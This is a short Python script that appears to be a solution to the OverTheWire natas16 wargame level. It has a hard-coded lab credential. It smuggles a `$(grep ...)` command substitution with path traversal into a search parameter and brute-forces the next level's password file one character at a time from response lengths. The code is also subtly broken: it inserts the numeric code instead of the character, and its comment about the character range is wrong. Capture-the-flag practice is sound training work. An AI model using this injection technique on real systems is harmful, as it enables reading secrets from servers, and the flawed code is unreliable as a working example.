import requests

headers = {'Authorization': 'Basic bmF0YXMxNjpXYUlIRWFjajYzd25OSUJST0hlcWkzcDl0MG01bmhtaA=='}

url = 'http://natas16.natas.labs.overthewire.org/index.php'

password = ''

#from natas 15 we will assume that the password is 32 characters long

length = 32

# we have to insert a . before each character that we discover in order for this to work
# essentially, we are testing the following:
# 'grep ^{}'.format(a)
# 'grep ^.{}'.format(a)
# 'grep ^..{}'.format(a)
# etc, until all 32 characters have been found

position = '' 

for c in range(0,length): #loop for each character in the password
    print(position)
    for i in range(48,123): #loop for each possible ascii character (48-123 contains all upper/lowercase letters, and digits)
        payload = '?needle=%24%28grep+%5E{}{}+..%2F..%2F..%2F..%2Fetc%2Fnatas_webpass%2Fnatas17%29&submit=Search'.format(position, i)
        
        r = requests.get(url+payload, headers=headers)
        if len(r.text) == 461926:
            password += chr(i)
            break
    position += '.'

print(password)
